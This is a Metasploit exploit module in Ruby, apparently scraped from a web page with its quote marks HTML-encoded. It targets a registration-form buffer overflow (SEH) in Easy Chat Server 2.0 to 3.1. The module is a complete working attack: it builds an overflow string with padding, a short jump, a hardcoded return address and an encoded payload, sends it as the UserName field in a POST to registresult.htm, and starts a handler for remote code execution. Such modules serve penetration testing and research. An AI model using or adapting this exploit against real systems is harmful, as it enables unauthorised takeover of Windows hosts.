# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Easy Chat Server User Registeration Buffer Overflow (SEH)&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a buffer overflow during user registration in Easy Chat Server software.
      },
      &#039;Author&#039;         =>
        [
          &#039;Marco Rivoli&#039;, #Metasploit
          &#039;Aitezaz Mohsin&#039; #POC
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;42155&#039; ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Easy Chat Server 2.0 to 3.1&#039;, { &#039;Ret&#039; => 0x100104bc } ],
        ],
      &#039;DefaultOptions&#039; => {
          &#039;RPORT&#039; => 80,
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;ENCODER&#039; => &#039;x86/alpha_mixed&#039;
        },
      &#039;DisclosureDate&#039; => &#039;Oct 09 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def exploit
    sploit = rand_text_alpha_upper(217)
    sploit << "\xeb\x06\x90\x90"
    sploit << [target.ret].pack(&#039;V&#039;)
    sploit << payload.encoded
    sploit << rand_text_alpha_upper(200)

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(URI,&#039;registresult.htm&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039;  => {
        &#039;UserName&#039; => sploit,
        &#039;Password&#039; => &#039;test&#039;,
        &#039;Password1&#039; => &#039;test&#039;,
        &#039;Sex&#039; => 1,
        &#039;Email&#039; => &#039;x@&#039;,
        &#039;Icon&#039; => &#039;x.gif&#039;,
        &#039;Resume&#039; => &#039;xxxx&#039;,
        &#039;cw&#039; => 1,
        &#039;RoomID&#039; => 4,
        &#039;RepUserName&#039; => &#039;admin&#039;,
        &#039;submit1&#039; => &#039;Register&#039;
      }
    })
    handler

  end
end

